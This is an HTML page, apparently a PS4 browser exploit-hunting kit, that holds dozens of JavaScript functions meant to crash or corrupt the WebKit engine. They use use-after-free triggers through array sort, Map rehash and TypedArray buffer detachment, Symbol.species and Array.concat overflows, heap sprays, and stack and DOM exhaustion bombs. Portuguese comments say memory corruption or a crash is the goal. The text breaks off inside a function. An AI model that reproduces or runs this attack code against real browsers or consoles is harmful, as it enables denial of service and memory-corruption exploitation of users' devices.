<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
    
    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>	

    <button onclick="runMicrotaskBomb()">MEMORIA Promise Microtask Starvation</button>
    <button onclick="runReplaceBomb()">MEMORIA String.replace Calculation Overflow</button>
    <button onclick="run10_AllocPanic()">MEMORIA Bad Array New Length</button>
    <button onclick="runBadArrayLength()">MEMORIA Bad Array Length (Integer Overflow)</button>

    <button onclick="runSortCorruption()">TEST 1: Array Sort Memory Corruption (Crash)</button>
    <button onclick="runRegexReplaceCrash()">TEST 2: RegExp Replace UAF</button>
    <button onclick="runJSONConfusion()">TEST 3: JSON Serializer Confusion</button>
    <button onclick="runSpeciesOOB()">TEST 1: TypedArray Species OOB Write</button>
    <button onclick="runArgumentsCrash()">TEST 2: Arguments JIT Optimization Crash</button>
    <button onclick="runRopeUAF()">TEST 3: String Rope Read-After-Free</button>
    <button onclick="runImageDataOverflow()">TEST 1: ImageData Integer Overflow (Crash)</button>
    <button onclick="runIteratorDetach()">TEST 2: TypedArray Iterator Detach (UAF)</button>
    <button onclick="runRegexStackSmash()">TEST 3: RegExp Compiler Stack Smash</button>
    <button onclick="runZlibCrash()">TEST 1: DecompressionStream Buffer Overflow</button>
    <button onclick="runLocaleStack()">TEST 2: Intl.Locale Stack Smash</button>
    <button onclick="runConcatOOB()">TEST 3: Array.concat Spreadable Overflow</button>
    <button onclick="runTypedArrayDetach()">TEST 1: TypedArray.set Detach (Heap UAF)</button>
    <button onclick="runAudioRace()">TEST 2: AudioBuffer Thread Race (Audio Crash)</button>
    <button onclick="runCanvasRace()">TEST 3: Canvas toBlob Resize Race</button>
    <button onclick="runAssignCrash()">TEST 1: Object.assign Structure ID Corruption</button>
    <button onclick="runConcatCrash()">TEST 2: Array.concat Heap Overflow</button>
    <button onclick="runMapRehash()">TEST 3: Map Rehash Use-After-Free</button>
    <button onclick="runReduceRightOOB()">TEST 1: Array.reduceRight Detach (Heap OOB)</button>
    <button onclick="runApplySmash()">TEST 2: Function.apply Stack Smash</button>
    <button onclick="runDecoderCorruption()">TEST 3: TextDecoder State Corruption</button>
    <button onclick="runSortSuicide()">TEST 1: Array Sort Suicide (Use-After-Free)</button>
    <button onclick="runRegExpDestruction()">TEST 2: RegExp Input Destruction</button>
    <button onclick="runPortRace()">TEST 3 CRASH: MessagePort Transfer Race</button>
    <button onclick="runPortRace_Aggressive()">TEST 4 CRASH: MessagePort Transfer Race</button>
    <button onclick="runAudioParamCrash()">TEST 1: AudioParam Buffer Detach (Kernel UAF)</button>
    <button onclick="runSelectUAF()">TEST 2: Select Options Length UAF</button>
    <button onclick="runGridCrash()">TEST 3: CSS Grid Track Overflow</button>
    <button onclick="runStringOverflow()">TEST 1: String.repeat Integer Overflow</button>
    <button onclick="runSparseReverse()">TEST 2: Sparse Array Reverse (Memory Corruption)</button>
    <button onclick="runCSSFlood()">TEST 3: CSS Property Hash Collision/Overflow</button>
    <button onclick="runLocaleCompareCrash()">TEST 1: Locale Compare Stack Smash</button>
    <button onclick="runDateFormatCrash()">TEST 2: Date Format Buffer Overflow</button>
    <button onclick="runRegExpStateCrash()">TEST 3: RegExp Execution State Desync</button>
    <button onclick="runGCResurrection()">TEST 1: FinalizationRegistry UAF (GC Panic)</button>
    <button onclick="runCanvasStack()">TEST 2: Canvas Save() Stack Exhaustion</button>
    <button onclick="runReplaceReentrancy()">TEST 3: Node.replaceChild Reentrancy</button>


	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) {          
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }

        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando m√©todo alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Aten√ß√£o: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Hist√≥rico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do bot√£o PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`N√≠vel ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Prov√°vel OOM): " + e.message);
            }
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        // --- STACK OVERFLOW ---

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        } 
function runSortCorruption() {
            log("Iniciando Sort Corruption...");
            
            try {
                // Cria um array grande o suficiente para ativar o QuickSort do C++
                const arr = [];
                for(let i=0; i<1000; i++) arr[i] = i;

                log("Array criado (1000 itens). Iniciando sort...");

                // A fun√ß√£o de compara√ß√£o √© chamada centenas de vezes pelo C++
                arr.sort((a, b) => {
                    // Gatilho: Quando o sort estiver no meio do trabalho
                    if (a === 500 || b === 500) {
                        // ZERA o array. A mem√≥ria original √© marcada como livre.
                        arr.length = 0;
                        
                        // SPRAY: Aloca imediatamente outra coisa para ocupar o lugar
                        // Se o C++ continuar escrevendo, ele vai corromper ESTE novo array
                        const spray = new Float64Array(10000).fill(1.1);
                        
                        // Retorna 0 para dizer "s√£o iguais", mantendo o C++ rodando
                        return 0;
                    }
                    return a - b;
                });

                // Se o navegador n√£o crashou, verificamos o estado
                log("Sort terminou.");
                log("Array original length: " + arr.length);
                
                // Se arr.length for > 0 ou contiver lixo, houve corrup√ß√£o
                if (arr.length > 0 && arr[0] === undefined) {
                    log("ALERTA: Array fantasma detectado!");
                }

            } catch(e) {
                // Se der erro de script, o motor se protegeu.
                // Se der TELA AZUL ou FECHAR o app, √© SUCESSO.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: RegExp Replace UAF ---
        // Tenta corromper a string de origem durante uma substitui√ß√£o global.
        function runRegexReplaceCrash() {
            log("Iniciando RegExp Replace UAF...");
            
            try {
                let str = "A".repeat(10000);
                const re = /A/g;
                
                // Objeto que ser√° usado como "replacement"
                const evilReplace = {
                    toString: () => {
                        // A cada substitui√ß√£o, este c√≥digo roda.
                        // Tenta invalidar a string original ou a regex
                        re.lastIndex = 0; // Reseta o √≠ndice no meio do loop
                        str = null; // Remove a refer√™ncia
                        
                        // Tenta for√ßar GC
                        const junk = new Array(1000).fill("X");
                        return "B";
                    }
                };

                // Executa o replace
                // O motor C++ est√° iterando sobre 'str'.
                // O callback altera 're' e 'str'.
                String.prototype.replace.call(str, re, evilReplace);
                
                log("Replace terminou.");
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 3: JSON Serializer Confusion ---
        // Tenta confundir o JSON.stringify usando um objeto que muda de identidade.
        function runJSONConfusion() {
            log("Testando JSON Serializer...");
            
            const target = {
                get a() {
                    // Quando o serializer l√™ 'a', deletamos 'b'
                    delete this.b;
                    // E colocamos um objeto grande em 'c' para mover a mem√≥ria
                    this.c = new Array(1000).fill(1.1);
                    return 1;
                },
                b: 2,
                c: 3
            };

            try {
                // O JSON.stringify percorre as chaves em ordem.
                // Ele v√™ 'a', 'b', 'c'.
                // L√™ 'a' -> roda nosso getter -> apaga 'b'.
                // O que acontece quando ele tenta ler 'b' que estava na lista inicial?
                const json = JSON.stringify(target);
                log("JSON gerado: " + json);
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        } 
function runSpeciesOOB() {
            log("Iniciando Ataque 'Species' (OOB Write)...");
            
            try {
                // Cria um array fonte cheio de 'A' (0x41)
                const source = new Uint8Array(1000).fill(0x41);
                
                // Define o construtor malicioso
                source.constructor = {
                    [Symbol.species]: function(len) {
                        // O WebKit pede um buffer de tamanho 'len' (1000)
                        // N√≥s retornamos um buffer MIN√öSCULO (1 byte)
                        log(`Engine pediu buffer de tamanho ${len}. Retornando buffer de 1 byte...`);
                        return new Uint8Array(1); 
                    }
                };

                // O m√©todo 'map' usa 'species' para criar o destino.
                // Se o loop C++ usar o tamanho de 'source' (1000) para escrever no destino (1),
                // ele vai sobrescrever 999 bytes de mem√≥ria vizinha (Heap Overflow).
                const result = source.map(x => x);
                
                log("Opera√ß√£o conclu√≠da (Se o browser n√£o fechou, pode ter protegido).");
                log("Tamanho do resultado: " + result.length);
                
            } catch(e) {
                log("Erro (Mitiga√ß√£o Ativa): " + e.message);
            }
        }

        // --- TESTE 2: Arguments JIT Optimization Crash ---
        // Confunde a otimiza√ß√£o de acesso √† stack usando o objeto 'arguments'.
        function runArgumentsCrash() {
            log("Testando Arguments Type Confusion...");
            
            function confuse(arg) {
                // O compilador tenta otimizar o acesso a 'arguments[0]'
                // N√≥s mudamos a estrutura de 'arguments' deletando √≠ndices
                delete arguments[0];
                
                // Agora definimos uma propriedade getter na cadeia de prot√≥tipos
                Object.defineProperty(Object.prototype, "0", {
                    get: () => {
                        log("Getter na prototype chain ativado!");
                        // Tenta invalidar a stack frame atual
                        return 0xDEADBEEF;
                    },
                    configurable: true
                });
                
                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
                return arguments[0];
            }

            // Treina o motor com chamadas normais
            for(let i=0; i<1000; i++) confuse(1);
            
            log("Executando acesso confuso...");
            const val = confuse(1);
            
            if (val === 0xDEADBEEF) {
                log("Comportamento Correto (Lento).");
            } else if (val === undefined) {
                log("Indefinido (Seguro).");
            } else {
                log(`ALERTA: Valor inesperado lido! ${val} (Poss√≠vel leitura de Stack lixo)`);
            }
            
            delete Object.prototype["0"]; // Limpeza
        }

        // --- TESTE 3: String Rope Read-After-Free ---
        // Tenta ler uma string fragmentada enquanto for√ßamos o GC a destru√≠-la.
        function runRopeUAF() {
            log("Iniciando String Rope Stress...");
            
            let rope = "";
            const chunk = "1234567890";
            
            // Constr√≥i uma Rope gigante (√°rvore de strings)
            for(let i=0; i<5000; i++) rope += chunk;
            
            // Cria um objeto que tenta acessar a string quando convertido
            const observer = {
                toString: () => {
                    // Tenta acessar um caractere da rope
                    // Se a rope foi movida/achatada incorretamente, pode ler lixo
                    return rope.charAt(100);
                }
            };
            
            try {
                log("For√ßando achatamento com observador...");
                
                // O replace for√ßa a convers√£o/leitura da string
                // Passamos 'observer' como argumento, for√ßando intera√ß√£o JS<->C++
                String.prototype.replace.call(rope, /1/, observer);
                
                log("Teste Rope finalizado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 function runImageDataOverflow() {
            log("Iniciando ImageData Math Attack...");
            
            try {
                // Valores cr√≠ticos para 32-bit (0xFFFFFFFF)
                // 1073741824 * 4 = 0 (Overflow exato)
                // Vamos tentar valores pr√≥ximos para enganar a valida√ß√£o
                const targets = [
                    { w: 1073741824, h: 1 }, // 4GB exato
                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se n√£o checado)
                    { w: 23170, h: 23170 }   // ~2GB bytes
                ];

                targets.forEach((t, i) => {
                    try {
                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
                        // O construtor pode lan√ßar IndexSizeError (Seguro)
                        // Se passar e o c√°lculo estiver errado -> Heap Corruption
                        const img = new ImageData(t.w, t.h);
                        log("ALERTA: ImageData criado! Verifique estabilidade.");
                        
                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
                        const len = img.data.length;
                        log("Buffer Length reportado: " + len);
                        
                    } catch(e) {
                        // Erro esperado se a prote√ß√£o funcionar
                    }
                });
                
                log("Teste ImageData finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: TypedArray Iterator Detach ---
        // Usa um iterador malicioso para confundir a constru√ß√£o de um TypedArray.
        // Tenta mudar a mem√≥ria subjacente durante a c√≥pia.
        function runIteratorDetach() {
            log("Iniciando Iterator Detach Attack...");
            
            try {
                const kSize = 1024;
                let detached = false;
                
                // Buffer que ser√° a fonte (ou alvo de confus√£o)
                const buffer = new ArrayBuffer(kSize);
                const view = new Uint8Array(buffer);
                
                // Iterador malicioso
                const iterable = {
                    [Symbol.iterator]() {
                        let step = 0;
                        return {
                            next() {
                                step++;
                                if (step === 10) {
                                    log("Trigger no passo 10! Tentando 'Detach'...");
                                    // Tenta "roubar" o buffer (Neutering) transferindo para um Worker
                                    try {
                                        const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                                        w.postMessage(buffer, [buffer]);
                                        w.terminate();
                                        detached = true;
                                        log("Buffer transferido (Neutered).");
                                    } catch(e) { log("Falha no Detach: " + e.message); }
                                }
                                
                                if (step > 100) return { done: true };
                                return { value: 0x41, done: false };
                            }
                        };
                    }
                };

                log("Executando Uint8Array.from()...");
                // O C++ come√ßa a copiar valores do iterador para o novo array.
                // Se o iterador invalidar a mem√≥ria global, o C++ pode crashar.
                const res = Uint8Array.from(iterable);
                
                log("Opera√ß√£o conclu√≠da.");
                if (detached && buffer.byteLength === 0) {
                    log("Estado: Buffer foi desanexado com sucesso durante o loop.");
                }

            } catch(e) {
                log("Erro Iterator: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Compiler Stack Smash ---
        // Cria uma Regex com profundidade absurda para estourar a stack do compilador JIT/Yarr.
        function runRegexStackSmash() {
            log("Iniciando RegExp Stack Bomb...");
            
            setTimeout(() => {
                try {
                    // O WebKit costuma aguentar alguns milhares, mas 50.000 √© brutal.
                    const depth = 50000;
                    log(`Gerando padr√£o com profundidade ${depth}...`);
                    
                    // Gera "((((....))))"
                    const pattern = "(".repeat(depth) + "A" + ")".repeat(depth);
                    
                    log("Compilando RegExp (Isso pode crashar a aba)...");
                    // O crash acontece AQUI, na compila√ß√£o
                    const re = new RegExp(pattern);
                    
                    log("Executando match...");
                    re.test("A");
                    
                    log("RegExp sobreviveu.");
                    
                } catch(e) {
                    log("Erro RegExp (Prov√°vel Stack Overflow protegido): " + e.message);
                }
            }, 100);
        }
 // --- TESTE 1: DecompressionStream Buffer Overflow ---
        // Ataca a implementa√ß√£o 'inflate' encontrada no 1200.elf.
        // Envia um stream gzip malformado que tenta enganar o alocador.
        async function runZlibCrash() {
            log("Iniciando ataque ao zlib (inflate)...");
            
            if (!window.DecompressionStream) {
                log("API DecompressionStream n√£o suportada.");
                return;
            }

            try {
                // 1. Cria um payload comprimido v√°lido (header gzip)
                // Header m√≠nimo gzip: 1F 8B 08 00 ...
                const header = [0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00];
                
                // 2. Adiciona um bloco de dados "mentiroso"
                // Tenta dizer que o bloco tem tamanho X mas fornece Y
                const badBlock = new Uint8Array(1024 * 1024).fill(0x41); // 1MB de dados
                
                const payload = new Uint8Array([...header, ...badBlock]);
                
                // 3. Cria o stream
                const ds = new DecompressionStream("gzip");
                const writer = ds.writable.getWriter();
                const reader = ds.readable.getReader();
                
                log("Escrevendo dados maliciosos no descodificador...");
                writer.write(payload);
                
                // Tenta ler. Se o 'inflate' C++ n√£o validar os limites internos, crash.
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    log("Lidos " + value.length + " bytes (Sem crash).");
                }
                log("Zlib sobreviveu.");

            } catch(e) {
                log("Erro Zlib: " + e.message);
            }
        }

        // --- TESTE 2: Intl.Locale Stack Smash ---
        // Ataca o parser de strings de localiza√ß√£o da libc.
        // Cria uma string de locale absurdamente complexa e profunda.
        function runLocaleStack() {
            log("Atacando Parser de Locale (libc)...");
            
            try {
                // Constr√≥i um locale com milhares de extens√µes unicode (-u-...)
                // O parser C++ muitas vezes usa recurs√£o para processar subtags.
                let toxicLocale = "en";
                const subtag = "-u-ca-gregory";
                
                // 10.000 repeti√ß√µes = ~150KB de string de locale
                // Isso √© muito maior do que qualquer buffer de pilha razo√°vel (geralmente 4KB ou 64KB)
                for(let i=0; i<10000; i++) {
                    toxicLocale += subtag + i; // Torna √∫nico para evitar cache
                }
                
                log(`Gerado locale de tamanho: ${toxicLocale.length}`);
                log("Instanciando Intl.Locale...");
                
                // O Crash deve ocorrer aqui, dentro do construtor C++
                const loc = new Intl.Locale(toxicLocale);
                
                log("Parser sobreviveu. BaseName: " + loc.baseName.substring(0, 50) + "...");
                
            } catch(e) {
                // RangeError √© a defesa do JS. Estamos procurando o Crash (tela azul/fechar).
                log("Erro Locale: " + e.message);
            }
        }

        // --- TESTE 3: Array.concat Spreadable Overflow ---
        // Ataca o c√°lculo de tamanho do Array.concat.
        // Usa um Proxy para mentir sobre o tamanho e conte√∫do durante a concatena√ß√£o.
        function runConcatOOB() {
            log("Iniciando Array.concat Type Confusion...");
            
            try {
                // Array alvo
                const target = [1.1];
                
                // Objeto malicioso que finge ser um array espalh√°vel
                const proxy = new Proxy({}, {
                    get(target, prop) {
                        if (prop === Symbol.isConcatSpreadable) return true;
                        
                        if (prop === "length") {
                            log("Engine leu length. Retornando tamanho gigante...");
                            // Retorna um tamanho que pode causar overflow se somado ao target
                            // Em 32-bit: 0xFFFFFFFF
                            return 4294967295; 
                        }
                        
                        if (prop === "0") {
                            log("Engine leu √≠ndice 0.");
                            return 0x41414141;
                        }
                        
                        return undefined;
                    },
                    has(target, prop) { return true; } // Finge ter todas as propriedades
                });

                log("Executando concat()...");
                
                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
                // Se houver Integer Overflow, ele aloca pouco.
                // Depois tenta copiar os itens. Se n√£o verificar limites, escreve fora.
                const res = target.concat(proxy);
                
                log("Concat terminou (Sem Crash). Length: " + res.length);
                
            } catch(e) {
                // "Out of memory" ou "Invalid array length" s√£o bons sinais.
                // Crash √© o objetivo.
                log("Erro Concat: " + e.message);
            }
        } 
 function runTypedArrayDetach() {
            log("Iniciando TypedArray.set Detach...");
            
            try {
                const size = 1024 * 1024 * 10; // 10MB
                const target = new Uint8Array(size);
                
                // Objeto fonte malicioso
                const source = {
                    length: size,
                    get 0() {
                        // O primeiro acesso dispara o ataque
                        log("C++ come√ßou a ler. Transferindo buffer...");
                        
                        try {
                            // Neutra o alvo transferindo para um Worker morto
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                            w.postMessage(target.buffer, [target.buffer]);
                            w.terminate();
                            
                            log("Buffer 'target' neutralizado.");
                        } catch(e) { log("Falha no detach: " + e); }
                        
                        return 0x41;
                    }
                };

                // A opera√ß√£o 'set' deve ser otimizada em C++.
                // Se ela n√£o checar se 'target.buffer' ainda √© v√°lido a cada byte, escreve no lixo.
                log("Executando target.set(source)...");
                target.set(source);
                
                log("Opera√ß√£o sobreviveu (Buffer Length: " + target.byteLength + ")");
                
            } catch(e) {
                log("Erro (Browser Protegeu): " + e.message);
            }
        }

        // --- TESTE 2: AudioBuffer Thread Race (Audio Crash) ---
        // Cria uma condi√ß√£o de corrida entre a thread de √°udio (Kernel/Hardware) e a thread JS.
        function runAudioRace() {
            log("Iniciando Audio Thread Race...");
            
            try {
                // 1. Configura o √°udio
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const frames = 44100; // 1 segundo
                const channels = 2;
                
                // Cria um buffer de √°udio
                const audioBuf = ctx.createBuffer(channels, frames, 44100);
                
                // Enche com ru√≠do
                for (let i = 0; i < channels; i++) {
                    const data = audioBuf.getChannelData(i);
                    for (let j = 0; j < frames; j++) data[j] = Math.random();
                }

                // 2. Prepara o Worker para roubar a mem√≥ria
                // Nota: AudioBuffers n√£o s√£o transfer√≠veis diretamente em specs antigas,
                // mas podemos tentar transferir os ArrayBuffers internos dos canais.
                const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));

                // 3. O GOLPE: Toca e transfere simultaneamente
                const src = ctx.createBufferSource();
                src.buffer = audioBuf;
                src.connect(ctx.destination);
                
                log("Iniciando reprodu√ß√£o...");
                src.start();
                
                // Tenta transferir os dados subjacentes imediatamente
                // Isso tenta puxar o tapete da thread de √°udio
                try {
                    // A API Web Audio antiga pode permitir acesso direto ao buffer
                    const rawData = audioBuf.getChannelData(0).buffer;
                    w.postMessage(rawData, [rawData]);
                    log("Buffer de canal transferido enquanto toca!");
                } catch(e) {
                    log("Transfer√™ncia bloqueada: " + e.message);
                }
                
                // Estressa a CPU para aumentar a chance de colis√£o
                let x = 0;
                for(let k=0; k<1000000; k++) x += Math.sqrt(k);

            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 3: Canvas toBlob Resize Race ---
        // Ataca o encoder de imagem ass√≠ncrono.
        function runCanvasRace() {
            log("Iniciando Canvas toBlob Race...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Desenha algo pesado (ru√≠do)
            const id = ctx.createImageData(4000, 4000);
            for(let i=0; i<id.data.length; i+=4) id.data[i] = 255;
            ctx.putImageData(id, 0, 0);
            
            // Loop de tentativa de Race
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                if (attempts > 20) {
                    clearInterval(interval);
                    log("Teste Canvas finalizado.");
                    return;
                }

                // 1. Inicia a codifica√ß√£o (Ass√≠ncrono)
                canvas.toBlob(function(blob) {
                    // Callback (pode nunca ser chamado se crashar antes)
                }, 'image/jpeg', 0.95);
                
                // 2. O GOLPE: Redimensiona imediatamente (Liberta mem√≥ria de pixels)
                // Tenta acertar o momento em que o encoder est√° lendo os pixels
                canvas.width = 0;
                canvas.width = 4000; // Restaura para a pr√≥xima tentativa
                
                // Redesenha (para ter mem√≥ria para libertar na pr√≥xima)
                ctx.fillRect(0,0,100,100); 
                
                if (attempts % 5 === 0) log("Tentativa " + attempts + "...");
                
            }, 100);
        }
 function runAssignCrash() {
            log("Iniciando Object.assign Attack...");
            
            try {
                const target = {};
                // Cria uma estrutura inicial para o destino (treina o motor)
                for (let i = 0; i < 100; i++) target["p" + i] = i;
                
                const source = new Proxy({}, {
                    ownKeys: function() {
                        return ['a', 'b', 'c'];
                    },
                    getOwnPropertyDescriptor: function() {
                        return { configurable: true, enumerable: true };
                    },
                    get: function(t, prop) {
                        if (prop === 'b') {
                            log("Getter 'b' acionado. Destruindo estrutura do alvo...");
                            // O GOLPE: Apaga todas as propriedades do destino
                            // Isso muda o StructureID e encolhe o objeto
                            for (let i = 0; i < 100; i++) delete target["p" + i];
                            
                            // Tenta for√ßar compacta√ß√£o do Garbage Collector
                            const junk = new Array(5000).fill(1.1);
                        }
                        return 0x41414141; // Valor marcador
                    }
                });

                log("Executando Object.assign...");
                // Se o C++ calculou o offset de escrita para 'c' baseada na estrutura antiga,
                // ele vai escrever 0x41414141 em mem√≥ria n√£o alocada.
                Object.assign(target, source);
                
                log("Opera√ß√£o sobreviveu (Verifique integridade).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Array.concat Heap Overflow ---
        // Explora o c√°lculo de tamanho do concat com objetos 'spreadable'.
        function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto que finge ser um array gigante
                const badSpreadable = {
                    [Symbol.isConcatSpreadable]: true,
                    length: 0xFFFFFFFF, // Tamanho m√°ximo 32-bit
                    0: 1,
                    1: 2
                };

                log("Concatenando array gigante...");
                
                // Se o motor somar target.length (0) + badSpreadable.length (4GB),
                // e ocorrer Integer Overflow, ele pode alocar um buffer pequeno.
                // Mas se o loop de c√≥pia tentar ler at√© 4GB, crasha.
                const res = target.concat(badSpreadable);
                
                log("Concat finalizado. Length: " + res.length);
                
            } catch(e) {
                log("Erro Concat (Prov√°vel OOM): " + e.message);
            }
        }

        // --- TESTE 3: Map Rehash Use-After-Free ---
        // For√ßa o redimensionamento da tabela interna do Map durante a itera√ß√£o.
        function runMapRehash() {
            log("Iniciando Map Rehash UAF...");
            
            try {
                const map = new Map();
                const count = 10000; // Quantidade suficiente para for√ßar rehash
                
                // Enche o mapa
                for (let i = 0; i < count; i++) map.set(i, i);
                
                log("Map cheio. Iterando e modificando...");
                
                let idx = 0;
                for (const [key, val] of map) {
                    idx++;
                    // No meio da itera√ß√£o, deleta tudo e adiciona novos
                    // Isso for√ßa a libera√ß√£o da tabela antiga e aloca√ß√£o de uma nova
                    if (idx === 100) {
                        log("Trigger! Limpando e recriando...");
                        map.clear();
                        
                        // Adiciona novos itens para ocupar a mem√≥ria
                        for (let j = 0; j < 100; j++) map.set("new"+j, j);
                        
                        // O iterador C++ ainda tem o ponteiro para a tabela antiga?
                    }
                }
                
                log("Itera√ß√£o sobreviveu.");
                
            } catch(e) {
                log("Erro Map: " + e.message);
            }
        }
function runReduceRightOOB() {
            log("Iniciando reduceRight OOB Attack...");
            
            try {
                // Array com dados conhecidos
                const arr = [1, 2, 3, 4, 5];
                let leaked = [];

                // O reduceRight vai do √≠ndice 4 at√© 0.
                arr.reduceRight((acc, val, index) => {
                    log(`Visitando √≠ndice ${index}...`);
                    
                    // O GOLPE: No primeiro passo (√≠ndice 4), zeramos o array.
                    if (index === 4) {
                        log("Detaching array (Length = 0)...");
                        arr.length = 0;
                        
                        // Tenta preencher o espa√ßo liberado com lixo para detetar leitura
                        try { arr.push(0x41414141); } catch(e){}
                    }
                    
                    // Se o motor continuar o loop para 3, 2, 1...
                    // Mas o array est√° vazio, ele vai ler o que?
                    // Se ler undefined, √© seguro. Se ler o nosso 0x41414141 ou outro valor, √© OOB.
                    if (index < 4 && val !== undefined) {
                        log(`ALERTA: Leitura OOB no √≠ndice ${index}! Valor: ${val}`);
                        leaked.push(val);
                    }
                    
                    return val;
                }, 0);
                
                if (leaked.length > 0) {
                    log("Vulnerabilidade Confirmada: Leu dados ap√≥s esvaziar.");
                } else {
                    log("Opera√ß√£o finalizada (Seguro - Loop parou ou leu undefined).");
                }

            } catch(e) {
                log("Erro (Motor Protegeu): " + e.message);
            }
        }

        // --- TESTE 2: Function.apply Stack Smash ---
        // Tenta estourar a Stack empurrando argumentos demais de uma s√≥ vez.
        function runApplySmash() {
            log("Iniciando Apply Stack Smash...");
            
            try {
                // Cria um array gigante (500.000 itens)
                // O tamanho da stack no PS4 √© limitado (geralmente 1MB ou menos para a thread principal)
                const hugeArgs = new Array(500000).fill(1);
                
                function target() {
                    return "Sobrevivi";
                }
                
                log(`Executando target.apply com ${hugeArgs.length} argumentos...`);
                
                // O GOLPE: O motor tem que copiar cada item para a Stack C++.
                // Se n√£o houver verifica√ß√£o de limite, a Stack atropela o Heap ou outras threads.
                target.apply(null, hugeArgs);
                
                log("Stack aguentou a carga.");
                
            } catch(e) {
                // RangeError √© o esperado se o JS pegar.
                // Crash (tela azul/fechar) √© o objetivo se o C++ pegar.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: TextDecoder State Corruption ---
        // Ataca a m√°quina de estados do descodificador de texto da libc.
        function runDecoderCorruption() {
            log("Iniciando TextDecoder State Fuzzing...");
            
            try {
